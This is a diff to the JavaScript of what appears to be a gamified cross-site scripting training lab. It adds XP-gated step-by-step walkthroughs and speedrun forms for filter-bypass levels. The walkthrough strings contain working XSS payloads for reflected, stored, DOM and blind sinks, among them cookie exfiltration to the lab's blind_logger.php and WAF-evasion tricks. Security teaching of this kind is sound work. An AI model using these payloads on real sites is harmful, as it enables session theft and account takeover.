@@ -359,6 +359,14 @@ document.addEventListener('DOMContentLoaded', ()=>{
     });
   };
 
+  const refreshShowMeWidgets = () => {
+    document.querySelectorAll('[data-show-me-shell]').forEach(shell => {
+      if (typeof shell._showMeRefresh === 'function'){
+        shell._showMeRefresh();
+      }
+    });
+  };
+
   const showXpDelta = (amount) => {
     if (!xpHudEl || !Number.isFinite(amount) || amount === 0){
       return;
@@ -434,14 +442,18 @@ document.addEventListener('DOMContentLoaded', ()=>{
   };
 
   const syncAuthUi = () => {
+    const isLoggedIn = authStore.isLoggedIn();
     if (authStatusEl){
-      authStatusEl.textContent = authStore.isLoggedIn()
+      authStatusEl.textContent = isLoggedIn
         ? `Logged in as ${authStore.getDisplayName()}`
         : 'Guest mode: progress stays on this device.';
     }
     if (authLogoutBtn){
-      authLogoutBtn.hidden = !authStore.isLoggedIn();
+      authLogoutBtn.hidden = !isLoggedIn;
     }
+    authOpenButtons.forEach(btn => {
+      btn.hidden = isLoggedIn;
+    });
   };
 
   syncAuthUi();
@@ -475,6 +487,7 @@ document.addEventListener('DOMContentLoaded', ()=>{
     refreshTipVaults();
     updateScenarioLocks();
     refreshSpeedrunWidgets();
+    refreshShowMeWidgets();
   };
 
   authForms.forEach(form => {
@@ -587,6 +600,7 @@ document.addEventListener('DOMContentLoaded', ()=>{
         });
         refreshTipVaults();
         updateScenarioLocks();
+        refreshShowMeWidgets();
       }
     });
   }
@@ -984,6 +998,14 @@ document.addEventListener('DOMContentLoaded', ()=>{
     const timerEl = shell.querySelector('[data-speedrun-timer]');
     const bestEl = shell.querySelector('[data-speedrun-best]');
     const listEl = shell.querySelector('[data-speedrun-list]');
+    const workbench = (() => {
+      const targetId = shell.dataset.speedrunWorkbench;
+      if (targetId){
+        return document.getElementById(targetId);
+      }
+      return null;
+    })();
+    const workbenchList = workbench?.querySelector('[data-speedrun-workbench-list]') || null;
     const defaultCount = parseInt(shell.dataset.defaultCount || '5', 10) || 5;
     let activeRun = null;
 
@@ -1006,38 +1028,100 @@ document.addEventListener('DOMContentLoaded', ()=>{
       }
     };
 
-    const renderList = (items) => {
-      if (!listEl){
+    const renderWorkbench = (items = []) => {
+      if (!workbenchList){
         return;
       }
-      listEl.innerHTML = '';
+      workbenchList.innerHTML = '';
       if (!items || !items.length){
-        const empty = document.createElement('div');
-        empty.className = 'speedrun-empty';
-        empty.textContent = 'Hit “Start run” to generate filters.';
-        listEl.appendChild(empty);
+        const placeholder = document.createElement('div');
+        placeholder.className = 'speedrun-workbench-empty';
+        placeholder.textContent = 'Start a speedrun to generate filter-specific inputs.';
+        workbenchList.appendChild(placeholder);
         return;
       }
       items.forEach((item, index) => {
-        const row = document.createElement('div');
-        row.className = 'speedrun-item';
+        const form = document.createElement('form');
+        form.className = 'speedrun-panel';
+        form.method = 'POST';
+        form.action = `?page=filter&level=${encodeURIComponent(item.level)}`;
+        form.target = '_blank';
+        form.dataset.speedrunPanel = item.id;
         if (item.complete){
-          row.classList.add('is-complete');
+          form.classList.add('is-complete');
         }
-        row.dataset.speedrunItem = item.id;
-        const body = document.createElement('div');
-        body.className = 'speedrun-item-body';
-        body.innerHTML = `<div class="speedrun-item-label">Filter ${index + 1}</div><div class="small">${item.name}</div>`;
-        const button = document.createElement('button');
-        button.type = 'button';
-        button.className = 'button speedrun-item-button';
-        button.dataset.speedrunComplete = 'true';
-        button.textContent = item.complete ? 'Completed' : 'Log bypass';
-        button.disabled = item.complete;
-        row.appendChild(body);
-        row.appendChild(button);
-        listEl.appendChild(row);
+        const title = document.createElement('div');
+        title.className = 'speedrun-panel-title';
+        title.textContent = `Filter ${index + 1}: ${item.name}`;
+        form.appendChild(title);
+        const helper = document.createElement('div');
+        helper.className = 'speedrun-panel-helper small';
+        helper.textContent = 'Submitting opens this level in a new tab so the timer keeps running.';
+        form.appendChild(helper);
+        const textarea = document.createElement('textarea');
+        textarea.className = 'input';
+        textarea.name = 'input';
+        textarea.rows = 3;
+        textarea.placeholder = `Payload for ${item.name}`;
+        form.appendChild(textarea);
+        const hiddenLevel = document.createElement('input');
+        hiddenLevel.type = 'hidden';
+        hiddenLevel.name = 'level';
+        hiddenLevel.value = item.level;
+        form.appendChild(hiddenLevel);
+        const hiddenSelect = document.createElement('input');
+        hiddenSelect.type = 'hidden';
+        hiddenSelect.name = 'level_select';
+        hiddenSelect.value = item.level;
+        form.appendChild(hiddenSelect);
+        const actions = document.createElement('div');
+        actions.className = 'speedrun-panel-actions';
+        const submit = document.createElement('button');
+        submit.type = 'submit';
+        submit.className = 'button';
+        submit.textContent = 'Send to filter lab';
+        actions.appendChild(submit);
+        form.appendChild(actions);
+        const status = document.createElement('div');
+        status.className = 'speedrun-panel-status small';
+        status.textContent = item.complete ? 'Marked as bypassed. On to the next filter!' : 'After it executes, click "Log bypass" above to track it.';
+        form.appendChild(status);
+        workbenchList.appendChild(form);
       });
+    };
+
+    const renderList = (items) => {
+      if (listEl){
+        listEl.innerHTML = '';
+        if (!items || !items.length){
+          const empty = document.createElement('div');
+          empty.className = 'speedrun-empty';
+          empty.textContent = 'Hit "Start run" to generate filters.';
+          listEl.appendChild(empty);
+        } else {
+          items.forEach((item, index) => {
+            const row = document.createElement('div');
+            row.className = 'speedrun-item';
+            if (item.complete){
+              row.classList.add('is-complete');
+            }
+            row.dataset.speedrunItem = item.id;
+            const body = document.createElement('div');
+            body.className = 'speedrun-item-body';
+            body.innerHTML = `<div class="speedrun-item-label">Filter ${index + 1}</div><div class="small">${item.name}</div>`;
+            const button = document.createElement('button');
+            button.type = 'button';
+            button.className = 'button speedrun-item-button';
+            button.dataset.speedrunComplete = 'true';
+            button.textContent = item.complete ? 'Completed' : 'Log bypass';
+            button.disabled = item.complete;
+            row.appendChild(body);
+            row.appendChild(button);
+            listEl.appendChild(row);
+          });
+        }
+      }
+      renderWorkbench(items);
     };
 
     const stopRun = () => {
@@ -1181,18 +1265,76 @@ document.addEventListener('DOMContentLoaded', ()=>{
   });
 
   const showMeScripts = {
-    'home-fast-track': [
-      `1. Reflected lab → load ?page=reflected&q=%3Cscript%3Ealert(1)%3C/script%3E to prove the sink executes instantly.`,
-      `2. Stored lab → drop <img src=x onerror=fetch("//localhost/blind_logger.php?p=rat")> into the message body so every visit pings you.`,
-      `3. DOM lab → change the URL hash to #%3Csvg/onload=alert(document.cookie)%3E to hijack the client-side widget.`,
-      `4. Blind XSS logger → submit ?page=blind&payload=%3Cimg%20src=//localhost/blind_logger.php?p=ratlab%3E then watch callbacks.`
+    'fundamentals-tour': [
+      `1. Click the HTML textarea and type <p>tour</p> so the DOM preview has something simple to render.`,
+      `2. Hit "Render snippet" and compare the live DOM surface with the escaped string to see how browsers interpret markup.`,
+      `3. Swap the text for <img src=x onerror=alert(document.domain)> to prove that injected attributes run immediately.`,
+      `4. Pause the helper and try your own markup—predict how both panels will react before pressing Render again.`
+    ],
+    'reflected-route': [
+      `1. Submit ?page=reflected&q=%3Csvg/onload=alert(1)%3E so the q parameter echoes unsanitised inside the response.`,
+      `2. Open DevTools → Network, inspect the HTML fragment and note how the value lands inside the results div with zero encoding.`,
+      `3. Replace alert(1) with fetch('/blind_logger.php?p='+document.cookie) to narrate real impact to your viewer.`,
+      `4. Your turn: craft a variant (attribute breakout, javascript: URL, etc.) and click "Submit & observe response" to prove it yourself.`
+    ],
+    'stored-route': [
+      `1. Post a harmless shoutbox entry to confirm that the database preserves whatever you send.`,
+      `2. Refresh the page and point out how the stored body renders as raw HTML for every visitor.`,
+      `3. Store <script>alert(document.domain)</script> (or an <img> handler) so the stored payload fires on load.`,
+      `4. Swap alert() for fetch('/blind_logger.php?p='+document.cookie) and then pause the walkthrough to build your own multi-line payload.`
+    ],
+    'dom-route': [
+      `1. Set the hash input to #%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E so location.hash contains an encoded payload.`,
+      `2. Watch decodeURIComponent(location.hash.substring(1)) feed straight into innerHTML—no sanitisation, instant execution.`,
+      `3. Upgrade the payload to fetch('/blind_logger.php?p='+document.cookie) to show data exfiltration from a DOM sink.`,
+      `4. Reset the hash, then manually try different encodings to keep exploiting the widget.`
+    ],
+    'blind-route': [
+      `1. Build a payload such as <script>new Image().src='/blind_logger.php?p='+encodeURIComponent(document.cookie)</script> inside the preview box.`,
+      `2. Explain that this payload must be delivered to an external admin panel—when it runs, the victim browser calls the logger URL.`,
+      `3. Visit /blind_logger.php?p=test in another tab to verify the callback path before sending the real exploit.`,
+      `4. Now craft your final payload with contextual data (cookies, DOM, CSRF tokens) and watch the "Recent blind hits" list for confirmation.`
+    ],
+    'filter-gauntlet': [
+      `1. Press "Start run" to populate the tracker and watch the workbench spawn dedicated forms for each random filter.`,
+      `2. Open the first mini form, drop <svg onload=alert(1)> and submit it to the filter page in a new tab to study the transformation.`,
+      `3. When a payload executes, return to the tracker and click "Log bypass"—if it fails, tweak the payload right in that mini form.`,
+      `4. Race through every panel, chaining different bypass styles until the timer stops and the run awards XP.`
+    ],
+    'contexts-tour-script': [
+      `1. Enter a compound payload such as '" )<svg/onload=alert(1)> and run the contexts test.`,
+      `2. Observe how the HTML body block renders it raw while the attribute block only breaks when quotes are escaped.`,
+      `3. Inspect the JavaScript string, URL and CSS outputs to note which characters are neutralised and which execute.`,
+      `4. Pause the helper and adjust the payload to target the context that looked most promising.`
+    ],
+    'playground-tour': [
+      `1. In Scenario 1, submit <img src=x onerror=alert('S1')> and point out the immediate reflected execution.`,
+      `2. Jump to Scenario 2, store <script>alert('S2')</script> in the body field and refresh to show it firing for every visitor.`,
+      `3. Visit Scenario 3 to mutate localStorage with encodeURIComponent('<img src=x onerror=alert(3)>') and explain the DOM sink.`,
+      `4. Pause the narration and continue through the remaining scenarios yourself, marking XP as each exploit lands.`
+    ],
+    'random-tour': [
+      `1. Generate a new random challenge and read the filter/context clues that load at the top of the card.`,
+      `2. Fire a baseline payload (e.g. <script>alert(0)</script>) to see which keywords or brackets vanish.`,
+      `3. Adjust encodings per the hints—maybe switch to an attribute injection or double-encoded payload until it executes.`,
+      `4. Re-roll the challenge and attempt the next stack without guidance now that you know the workflow.`
+    ],
+    'waf-tour': [
+      `1. Start on the Basic WAF level and send <script>alert(1)</script> to trigger the obvious signature block.`,
+      `2. Mutate the payload with casing or comment breaks (e.g. <sc<!-- -->ript>) and resubmit to demonstrate a bypass.`,
+      `3. Repeat the process for the Balanced and Paranoid levels while narrating which keywords each rule set focuses on.`,
+      `4. When the walkthrough ends, craft your own impact payload for every level and log the XP markers to prove mastery.`
     ]
   };
 
   document.querySelectorAll('[data-show-me-shell]').forEach(shell => {
     const trigger = shell.querySelector('[data-show-me-trigger]');
     const output = shell.querySelector('[data-show-me-output]');
+    const status = shell.querySelector('[data-show-me-status]');
     const scriptId = shell.dataset.showMeScript || trigger?.dataset.showMeScript;
+    const shellId = shell.dataset.showMeId || scriptId;
+    const cost = parseInt(shell.dataset.showMeCost || '0', 10);
+    const spendKey = shellId ? `showme:${shellId}` : null;
     if (!trigger || !output || !scriptId || !showMeScripts[scriptId]){
       shell.removeAttribute('data-show-me-shell');
       return;
@@ -1205,12 +1347,54 @@ document.addEventListener('DOMContentLoaded', ()=>{
         await sleep(22 + Math.random() * 18);
       }
     };
+    const hasAccess = () => cost <= 0 || !spendKey || (xpStore.data.tipsUsed && xpStore.data.tipsUsed[spendKey]);
+    const refreshState = () => {
+      const unlocked = hasAccess();
+      shell.classList.toggle('is-locked', !unlocked);
+      shell.classList.toggle('is-unlocked', unlocked);
+      if (status){
+        if (unlocked){
+          status.textContent = 'Unlocked. Watch the walkthrough, then pause and try it yourself.';
+        } else if (cost > 0){
+          status.textContent = `Costs ${cost} XP to unlock this walkthrough.`;
+        } else {
+          status.textContent = 'Ready to play the walkthrough.';
+        }
+      }
+      if (trigger){
+        trigger.textContent = unlocked ? 'Show me' : `Unlock & show me (-${cost} XP)`;
+        trigger.disabled = isPlaying;
+      }
+    };
+
+    shell._showMeRefresh = refreshState;
+    refreshState();
+
     trigger.addEventListener('click', async ()=>{
       if (isPlaying){
         return;
       }
+      if (!hasAccess()){
+        if (!spendKey || cost <= 0){
+          refreshState();
+        } else {
+          const result = xpStore.spendTip(spendKey, cost);
+          if (!result.ok){
+            showToast(result.reason === 'insufficient' ? `You need ${cost} XP to unlock this walkthrough.` : 'Unable to unlock walkthrough right now.');
+            return;
+          }
+          updateHud();
+          if (result.spent){
+            showXpDelta(-result.spent);
+          }
+          refreshState();
+        }
+      }
+      if (!hasAccess()){
+        return;
+      }
       isPlaying = true;
-      trigger.disabled = true;
+      refreshState();
       shell.classList.add('is-playing');
       output.innerHTML = '';
       const script = showMeScripts[scriptId];
@@ -1222,8 +1406,8 @@ document.addEventListener('DOMContentLoaded', ()=>{
         await sleep(260);
       }
       shell.classList.remove('is-playing');
-      trigger.disabled = false;
       isPlaying = false;
+      refreshState();
     });
   });
 
